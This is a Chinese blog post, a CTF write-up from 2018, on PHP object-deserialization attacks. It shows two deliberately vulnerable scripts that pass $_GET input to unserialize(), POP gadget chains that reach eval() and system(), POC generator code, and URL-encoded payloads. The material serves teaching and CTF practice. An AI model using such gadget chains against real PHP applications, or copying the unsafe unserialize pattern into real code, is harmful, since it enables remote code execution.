@@ -1,0 +1,339 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+
+
+
+<title>
+  
+    php反序列化组会例题和makerctf easy_unserialize的wp
+  
+</title>
+
+<meta name="description" content="因为比赛原因，所以这篇博客是推迟一星期放出的。主要讲一下上周组会和makerctf校内赛php反序列化题的思路。">
+<meta property="og:type" content="article">
+<meta property="og:title" content="php反序列化组会例题和makerctf easy_unserialize的wp">
+<meta property="og:url" content="http://yoursite.com/2018/05/12/Easy-Unserialize-Writeup/index.html">
+<meta property="og:site_name" content="Double--R blog">
+<meta property="og:description" content="因为比赛原因，所以这篇博客是推迟一星期放出的。主要讲一下上周组会和makerctf校内赛php反序列化题的思路。">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:image" content="https://raw.githubusercontent.com/doubler12138/zhoubao/master/photo/bizhi/1524793388.68.jpg">
+<meta property="og:image" content="https://raw.githubusercontent.com/doubler12138/zhoubao/master/photo/php-unserialize/test1.jpg">
+<meta property="og:image" content="https://raw.githubusercontent.com/doubler12138/zhoubao/master/photo/php-unserialize/test2.jpg">
+<meta property="og:updated_time" content="2018-05-13T14:06:29.677Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="php反序列化组会例题和makerctf easy_unserialize的wp">
+<meta name="twitter:description" content="因为比赛原因，所以这篇博客是推迟一星期放出的。主要讲一下上周组会和makerctf校内赛php反序列化题的思路。">
+<meta name="twitter:image" content="https://raw.githubusercontent.com/doubler12138/zhoubao/master/photo/bizhi/1524793388.68.jpg">
+
+
+  <link rel="alternative" href="/atom.xml" title="Double--R blog" type="application/atom+xml">
+
+
+
+  <link rel="icon" href="/favicon.png">
+
+
+<link rel="stylesheet" href="/perfect-scrollbar/css/perfect-scrollbar.min.css">
+<link rel="stylesheet" href="/styles/main.css">
+
+
+
+
+
+
+</head>
+<body
+  
+    class="monochrome"
+  
+  >
+  <div class="mobile-header">
+  <button class="sidebar-toggle" type="button">
+    <span class="icon-bar"></span>
+    <span class="icon-bar"></span>
+    <span class="icon-bar"></span>
+  </button>
+  <a class="title" href="/">Double--R blog</a>
+</div>
+
+  <div class="main-container">
+    <div class="sidebar">
+  <div class="header">
+    <h1 class="title"><a href="/">Double--R blog</a></h1>
+    
+      <p class="subtitle">
+        菜的要死的Double--R
+      </p>
+    
+    <div class="info">
+      <div class="content">
+        
+          <div class="description">一直学习就好</div>
+        
+        
+          <div class="author">Double--R</div>
+        
+      </div>
+      
+        <div class="avatar">
+          
+            <a href="/about"><img src="https://cn.gravatar.com/avatar/35fef74d731255cd569c2c2b0b9e87e4?s=200"></a>
+          
+        </div>
+      
+    </div>
+  </div>
+  <div class="body">
+    
+      
+        <ul class="nav">
+          
+            
+              <li class="category-list-container">
+                <a href="javascript:;">Category</a>
+                
+              </li>
+            
+          
+            
+              <li class="tag-list-container">
+                <a href="javascript:;">Tag</a>
+                
+              </li>
+            
+          
+            
+              <li class="archive-list-container">
+                <a href="javascript:;">Archive</a>
+                <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/">2020</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/">2018</a><span class="archive-list-count">26</span></li></ul>
+              </li>
+            
+          
+        </ul>
+      
+        <ul class="nav">
+          
+            
+              <li>
+                <a href="/" title="Homepage">Homepage</a>
+              </li>
+            
+          
+            
+              <li>
+                <a href="/archives" title="By Year">By Year</a>
+              </li>
+            
+          
+        </ul>
+      
+        <ul class="nav">
+          
+            
+              <li>
+                <a href="https://github.com/denjones/hexo-theme-chan" title="Chan" target="_blank" rel="noopener">Chan</a>
+              </li>
+            
+          
+            
+              <li>
+                <a href="https://github.com/denjones" title="Github" target="_blank" rel="noopener">Github</a>
+              </li>
+            
+          
+            
+              <li>
+                <a href="/atom.xml" title="RSS">RSS</a>
+              </li>
+            
+          
+        </ul>
+      
+    
+  </div>
+</div>
+
+    <div class="main-content">
+      
+        <div style="max-width: 1000px">
+      
+          <article id="post-Easy-Unserialize-Writeup" class="article article-type-post">
+  
+    <h1 class="article-header">
+      php反序列化组会例题和makerctf easy_unserialize的wp
+    </h1>
+  
+  
+
+  <div class="article-info">
+    <span class="article-date">
+  2018-05-12
+</span>
+
+    
+
+    
+
+  </div>
+  <div class="article-entry">
+    <p><strong>因为比赛原因，所以这篇博客是推迟一星期放出的。主要讲一下上周组会和makerctf校内赛php反序列化题的思路。</strong></p>
+<hr>
+<p><img src="https://raw.githubusercontent.com/doubler12138/zhoubao/master/photo/bizhi/1524793388.68.jpg" alt="Alt text"></p>
+<a id="more"></a>
+<p><strong>组会例题：</strong></p>
+<ul>
+<li><p>题目源码：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class test1</span><br><span class="line">&#123;</span><br><span class="line">   	public $varr;</span><br><span class="line">   	function __construct()</span><br><span class="line">   	&#123;</span><br><span class="line">   	    $this-&gt;varr = &quot;index.php&quot;;</span><br><span class="line">   	&#125;</span><br><span class="line">   	function __destruct()</span><br><span class="line">   	&#123;</span><br><span class="line">   	    if(file_exists($this-&gt;varr))&#123;</span><br><span class="line">   	        echo &quot;&lt;br /&gt;文件&quot;.$this-&gt;varr.&quot;存在&lt;br /&gt;&quot;;</span><br><span class="line">       	&#125;</span><br><span class="line">   	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class test2</span><br><span class="line">&#123;</span><br><span class="line">   	public $varr;</span><br><span class="line">   	public $obj;</span><br><span class="line">   	function __construct()</span><br><span class="line">   	&#123;</span><br><span class="line">   	    $this-&gt;varr=&apos;123456&apos;;</span><br><span class="line">   	    $this-&gt;obj=null;</span><br><span class="line">   	&#125;</span><br><span class="line">   	function __toString()</span><br><span class="line">   	&#123;</span><br><span class="line">   	    $this-&gt;obj-&gt;execute();</span><br><span class="line">   	    return $this-&gt;varr;</span><br><span class="line">   	&#125;</span><br><span class="line">   	function __destruct()</span><br><span class="line">   	&#123;</span><br><span class="line">   	    echo &quot;&lt;br /&gt;这是f2的析构函数&lt;br /&gt;&quot;;</span><br><span class="line">   	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class test3</span><br><span class="line">&#123;</span><br><span class="line">    public $varr;</span><br><span class="line">    function execute()</span><br><span class="line">    &#123;</span><br><span class="line">   	    eval($this-&gt;varr);</span><br><span class="line">   	&#125;</span><br><span class="line">   	function __destruct()</span><br><span class="line">   	&#123;</span><br><span class="line">   	    echo &quot;&lt;br /&gt;这是f3的析构函数&lt;br /&gt;&quot;;</span><br><span class="line">   	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">   	if (isset($_GET[&apos;x&apos;])) &#123;</span><br><span class="line">   	unserialize($_GET[&apos;x&apos;]);</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>目标：打出phpinfo。</p>
+</li>
+<li><p>代码分析：</p>
+<p>在test3类里有一个execute()函数，函数作用是将公有变量varr的值作为php代码执行。那么我们只要让变量varr的值为”phpinfo();”然后执行execute()函数就行了。但test3只定义了execute()函数，真正调用函数是在test2的<strong>toString函数里面，而且是通过”$this-&gt;obj-&gt;execute()”这样的形似调用的，而obj是test2中的一个变量。所以我们要定义obj为test3对象，这样才能调用test3类中的execute()函数。而test2的</strong>toString()函数被自动调用的条件是test2对象作为字符串使用。在test1类中的<strong>destruct()函数中有一个字符串的点拼接。其中$this-&gt;varr变量被拼接了，那么我们只要定义test1中的varr变量为test2对象，就能调用test2的</strong>toString()函数，就能调用test3的execute()函数，就能执行phpinfo()。</p>
+<p>生成POC的代码：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class test1&#123;</span><br><span class="line">	public $varr;</span><br><span class="line">	function __construct()&#123;</span><br><span class="line">		$this-&gt;varr = new test2();</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class test2&#123;</span><br><span class="line">	public $obj;</span><br><span class="line">	public $varr;</span><br><span class="line">	function __construct()&#123;</span><br><span class="line">		$this-&gt;obj= new test3();</span><br><span class="line">		$this-&gt;varr= &apos;123456&apos;;</span><br><span class="line">	&#125;</span><br><span class="line">	function __toString()</span><br><span class="line">   	&#123;</span><br><span class="line">       	$this-&gt;obj-&gt;execute();</span><br><span class="line">       	return $this-&gt;varr;</span><br><span class="line">   	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class test3</span><br><span class="line">&#123;</span><br><span class="line">   	public $varr;</span><br><span class="line">	function __construct()&#123;</span><br><span class="line">		$this-&gt;varr = &quot;phpinfo();&quot;;</span><br><span class="line">	&#125;</span><br><span class="line">   	function execute()</span><br><span class="line">   	&#123;</span><br><span class="line">   	    eval($this-&gt;varr);</span><br><span class="line">   	&#125;</span><br><span class="line">&#125;	</span><br><span class="line">$poc = new test1();</span><br><span class="line">echo urlencode(serialize($poc));</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>POC:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O%3A5%3A%22test1%22%3A1%3A%7Bs%3A4%3A%22varr%22%3BO%3A5%3A%22test2%22%3A2%3A%7Bs%3A3%3A%22obj%22%3BO%3A5%3A%22test3%22%3A1%3A%7Bs%3A4%3A%22varr%22%3Bs%3A10%3A%22phpinfo%28%29%3B%22%3B%7Ds%3A4%3A%22varr%22%3Bs%3A6%3A%22123456%22%3B%7D%7D</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>结果：</p>
+<p><img src="https://raw.githubusercontent.com/doubler12138/zhoubao/master/photo/php-unserialize/test1.jpg" alt="Alt text"></p>
+</li>
+</ul>
+<p><strong>makerctf easy_unserialize:</strong></p>
+<ul>
+<li><p>题目源码：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">class gg</span><br><span class="line">&#123;</span><br><span class="line">    private $gg;</span><br><span class="line">    public function __destruct()</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;gg-&gt;get1();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">class start</span><br><span class="line">&#123;</span><br><span class="line">   	private $start1;</span><br><span class="line">   	private $start2;</span><br><span class="line">   	public function get1()</span><br><span class="line">   	&#123;</span><br><span class="line">   	    $s1 = $this-&gt;start1;</span><br><span class="line">   	    $s2 = $this-&gt;start2;</span><br><span class="line">   	    $s1($s2);</span><br><span class="line">   	&#125;</span><br><span class="line">&#125;	</span><br><span class="line"></span><br><span class="line">class cat</span><br><span class="line">&#123;</span><br><span class="line">    private $name = &quot;蛋黄&quot;;</span><br><span class="line">    private $color = &quot;橘色&quot;;</span><br><span class="line">    private $weight = &quot;5公斤&quot;;</span><br><span class="line"></span><br><span class="line">    public function getName()</span><br><span class="line">    &#123;</span><br><span class="line">        return $this-&gt;name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function getColor()</span><br><span class="line">    &#123;</span><br><span class="line">        return $this-&gt;color;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">   	public function getWeight()</span><br><span class="line">   	&#123;</span><br><span class="line">   	    return $this-&gt;weight;</span><br><span class="line">   	&#125;</span><br><span class="line"></span><br><span class="line">    public function __invoke($args)</span><br><span class="line">    &#123;</span><br><span class="line">        echo $args.&quot;不是函数&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class test2</span><br><span class="line">&#123;</span><br><span class="line">    private $a;</span><br><span class="line">    public function __toString()</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;a-&gt;getFlag();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class flag</span><br><span class="line">&#123;</span><br><span class="line">    public function getFlag()</span><br><span class="line">    &#123;</span><br><span class="line">        system(&apos;cat ../flag.txt&apos;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$x = $_GET[&apos;x&apos;];</span><br><span class="line">if (isset($x)) &#123;</span><br><span class="line">    unserialize($x);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>代码分析：</p>
+<p>flag类里面有一个getFlag函数，作用是包含一个本地文件，内有flag。定义a为flag对象就可以在test2的<strong>toString()函数中调用getFlag()函数。在cat类中有</strong>invoke($args)函数做字符串的点拼接，定义$args为test2对象就可以在调用<strong>toString()函数。当对象以函数的形式调用时，</strong>invoke()函数自动调用。在start类中有get1函数，里面有$s1($s2)形式，当$s1为cat对象，$s2为test2对象时，调用<strong>invoke()和</strong>toString()。当gg类中的gg变量为start对象，就能调用get1函数。</p>
+</li>
+<li><p>生成POC的代码：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class gg</span><br><span class="line">&#123;</span><br><span class="line">    private $gg;</span><br><span class="line"></span><br><span class="line">	public function __construct()</span><br><span class="line">	&#123;</span><br><span class="line">		$this-&gt;gg = new start();</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line">class start</span><br><span class="line">&#123;</span><br><span class="line">    private $start1;</span><br><span class="line">    private $start2;</span><br><span class="line">	public function __construct()</span><br><span class="line">	&#123;</span><br><span class="line">		$this-&gt;start1 = new cat();</span><br><span class="line">		$this-&gt;start2 = new test2();</span><br><span class="line">	&#125;</span><br><span class="line">&#125;	</span><br><span class="line"></span><br><span class="line">class cat</span><br><span class="line">&#123;</span><br><span class="line">    public function __invoke($args)</span><br><span class="line">    &#123;</span><br><span class="line">        echo $args.&quot;不是函数&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class test2</span><br><span class="line">&#123;</span><br><span class="line">    private $a;</span><br><span class="line">	public function __construct()</span><br><span class="line">	&#123;</span><br><span class="line">		$this-&gt;a = new flag();</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class flag</span><br><span class="line">&#123;</span><br><span class="line">    public function getFlag()</span><br><span class="line">    &#123;</span><br><span class="line">        system(&apos;cat ../flag.txt&apos;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$poc = new gg();</span><br><span class="line">echo urlencode(serialize($poc));</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>POC:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O%3A2%3A%22gg%22%3A1%3A%7Bs%3A6%3A%22%00gg%00gg%22%3BO%3A5%3A%22start%22%3A2%3A%7Bs%3A13%3A%22%00start%00start1%22%3BO%3A3%3A%22cat%22%3A0%3A%7B%7Ds%3A13%3A%22%00start%00start2%22%3BO%3A5%3A%22test2%22%3A1%3A%7Bs%3A8%3A%22%00test2%00a%22%3BO%3A4%3A%22flag%22%3A0%3A%7B%7D%7D%7D%7D</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>结果：</p>
+<p><img src="https://raw.githubusercontent.com/doubler12138/zhoubao/master/photo/php-unserialize/test2.jpg" alt="Alt text"></p>
+</li>
+</ul>
+
+  </div>
+  <footer class="article-footer">
+    
+  <div class="cc">
+    <a href="http://creativecommons.org/licenses/by-sa/4.0/deed.z" target="_blank" title="Attribution-ShareAlike">
+      <img src="/images/cc/cc.png">
+      
+          <img src="/images/cc/by.png">
+        
+          <img src="/images/cc/sa.png">
+      
+      <span>
+        This work is licensed under a Creative Commons Attribution-ShareAlike 4.0 International License.
+      </span>
+    </a>
+  </div>
+
+
+    
+
+  </footer>
+</article>
+
+
+
+
+
+
+
+          <div class="main-footer">
+  
+    © 2018 Double--R blog - Powered by <a href="http://hexo.io" target="_blank">Hexo</a> - Theme <a href="https://github.com/denjones/hexo-theme-chan" target="_blank">Chan</a>
+  
+</div>
+
+      
+        </div>
+      
+    </div>
+  </div>
+  <script src="//apps.bdimg.com/libs/jquery/2.1.4/jquery.min.js"></script>
+
+  <link rel="stylesheet" href="/PhotoSwipe/photoswipe.css">
+  <link rel="stylesheet" href="/PhotoSwipe/default-skin/default-skin.css">
+
+  <!-- Root element of PhotoSwipe. Must have class pswp. -->
+  <div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+
+    <!-- Background of PhotoSwipe.
+             It's a separate element as animating opacity is faster than rgba(). -->
+    <div class="pswp__bg"></div>
+
+    <!-- Slides wrapper with overflow:hidden. -->
+    <div class="pswp__scroll-wrap">
+
+      <!-- Container that holds slides.
+                PhotoSwipe keeps only 3 of them in the DOM to save memory.
+                Don't modify these 3 pswp__item elements, data is added later on. -->
+      <div class="pswp__container">
+        <div class="pswp__item"></div>
+        <div class="pswp__item"></div>
+        <div class="pswp__item"></div>
+      </div>
+
+      <!-- Default (PhotoSwipeUI_Default) interface on top of sliding area. Can be changed. -->
+      <div class="pswp__ui pswp__ui--hidden">
+
+        <div class="pswp__top-bar">
+
+          <!--  Controls are self-explanatory. Order can be changed. -->
+
+          <div class="pswp__counter"></div>
+
+          <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+
+          <button class="pswp__button pswp__button--share" title="Share"></button>
+
+          <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+
+          <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+
+          <!-- Preloader demo http://codepen.io/dimsemenov/pen/yyBWoR -->
+          <!-- element will get class pswp__preloader--active when preloader is running -->
+          <div class="pswp__preloader">
+            <div class="pswp__preloader__icn">
+              <div class="pswp__preloader__cut">
+                <div class="pswp__preloader__donut"></div>
+              </div>
+            </div>
+          </div>
+        </div>
+
+        <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+          <div class="pswp__share-tooltip"></div>
+        </div>
+
+        <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)"></button>
+
+        <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)"></button>
+
+        <div class="pswp__caption">
+          <div class="pswp__caption__center"></div>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <script src="/PhotoSwipe/photoswipe.js"></script>
+  <script src="/PhotoSwipe/photoswipe-ui-default.js"></script>
+
+
+<script src="/perfect-scrollbar/js/min/perfect-scrollbar.min.js"></script>
+<script src="/scripts/main.js"></script>
+
+</body>
+</html>
